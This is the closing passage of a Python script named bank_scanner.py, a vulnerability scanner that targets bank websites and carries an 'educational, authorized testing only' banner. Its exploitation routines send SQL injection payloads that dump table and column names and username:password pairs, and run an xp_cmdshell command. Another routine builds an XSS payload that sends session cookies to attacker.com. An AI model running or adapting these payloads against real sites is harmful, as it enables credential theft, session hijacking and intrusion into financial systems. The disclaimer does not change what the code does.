                        f"CORS misconfiguration allows requests from {origin}"
                    )
                    print(f"    [!] CORS: Origin '{origin}' allowed")
                    
            except Exception as e:
                pass

    def generate_report(self):
        """Generate final report"""
        print(f"\n[+] Generating Report...")
        
        with open(self.output_file, 'a') as f:
            f.write(f"\n\n{'='*100}\n")
            f.write("SUMMARY\n")
            f.write(f"{'='*100}\n")
            f.write(f"Total Vulnerabilities Found: {len(self.vulnerabilities)}\n\n")
            
            # Group by severity
            severity_counts = {'Critical': 0, 'High': 0, 'Medium': 0, 'Low': 0, 'Info': 0}
            for vuln in self.vulnerabilities:
                severity_counts[vuln['severity']] += 1
            
            f.write("By Severity:\n")
            for severity, count in severity_counts.items():
                f.write(f"  {severity}: {count}\n")
            
            f.write("\nBy Type:\n")
            type_counts = {}
            for vuln in self.vulnerabilities:
                type_counts[vuln['type']] = type_counts.get(vuln['type'], 0) + 1
            for vuln_type, count in sorted(type_counts.items(), key=lambda x: x[1], reverse=True):
                f.write(f"  {vuln_type}: {count}\n")
            
            f.write("\n\nFull Vulnerability List:\n")
            for i, vuln in enumerate(self.vulnerabilities, 1):
                f.write(f"\n{i}. [{vuln['severity']}] {vuln['type']}")
                f.write(f"\n   URL: {vuln['url']}")
                f.write(f"\n   Payload: {vuln['payload']}")
                f.write(f"\n   Evidence: {vuln['evidence']}")
                f.write(f"\n   Description: {vuln['description']}")
        
        print(f"\n[+] Scan Summary:")
        print(f"    Total Vulnerabilities: {len(self.vulnerabilities)}")
        for severity, count in severity_counts.items():
            if count > 0:
                print(f"    {severity}: {count}")
        
        print(f"\n    Full report saved to: {self.output_file}")

    def test_exploit_sqli(self, url, param, payload):
        """Attempt SQL injection exploitation"""
        print(f"\n[!] Attempting SQLi exploitation on {param}...")
        self.log_vulnerability(
            "SQL Injection Exploitation Attempt", "Critical",
            url, payload,
            f"Attempting exploitation of parameter: {param}",
            "SQL injection exploitation in progress"
        )
        
        # Try to extract data
        extract_payloads = [
            f"' UNION SELECT group_concat(table_name) FROM information_schema.tables--",
            f"' UNION SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--",
            f"' UNION SELECT group_concat(username,':',password) FROM users--",
            f"'; EXEC xp_cmdshell('whoami');--",
        ]
        
        for ext_payload in extract_payloads:
            test_url = url.replace(f"{param}={payload}", f"{param}={ext_payload}")
            try:
                r = self.session.get(test_url, timeout=self.timeout)
                # Look for extracted data patterns
                if r.status_code == 200 and len(r.text) > 0:
                    self.log_vulnerability(
                        "SQL Injection Data Extraction", "Critical",
                        test_url, ext_payload,
                        f"Response length: {len(r.text)}",
                        f"Attempted data extraction via UNION query"
                    )
                    # Extract any meaningful data
                    soup = BeautifulSoup(r.text, 'html.parser')
                    text = soup.get_text()
                    print(f"    Response snippet: {text[:500]}")
            except:
                continue

    def exploit_xss(self, url, param, payload):
        """Attempt XSS exploitation with session stealing"""
        print(f"\n[!] Attempting XSS exploitation on {param}...")
        
        # Create a cookie-stealing XSS payload
        steal_payload = f"<script>new Image().src='http://attacker.com/steal?c='+document.cookie</script>"
        test_url = url.replace(f"{param}={payload}", f"{param}={steal_payload}")
        
        self.log_vulnerability(
            "XSS Exploitation Attempt", "Critical",
            test_url, steal_payload,
            "Attempting cookie theft via XSS",
            "Cross-site scripting exploitation with session cookie theft"
        )


def main():
    """Main entry point"""
    if len(sys.argv) != 2:
        print("Usage: python3 bank_scanner.py <target_url>")
        print("Example: python3 bank_scanner.py https://examplebank.com")
        sys.exit(1)
    
    target = sys.argv[1]
    if not target.startswith(('http://', 'https://')):
        target = 'https://' + target
    
    print(r"""
╔══════════════════════════════════════════════════════════════╗
║         BANK VULNERABILITY SCANNER - Educational Tool        ║
║                      For Authorized Testing Only              ║
╚══════════════════════════════════════════════════════════════╝
""")
    
    scanner = BankVulnScanner(target, max_threads=20, timeout=10)
    
    try:
        scanner.scan()
    except KeyboardInterrupt:
        print("\n[*] Scan interrupted by user")
        scanner.generate_report()
    except Exception as e:
        print(f"\n[!] Error: {e}")
        scanner.generate_report()


if __name__ == "__main__":
    main()
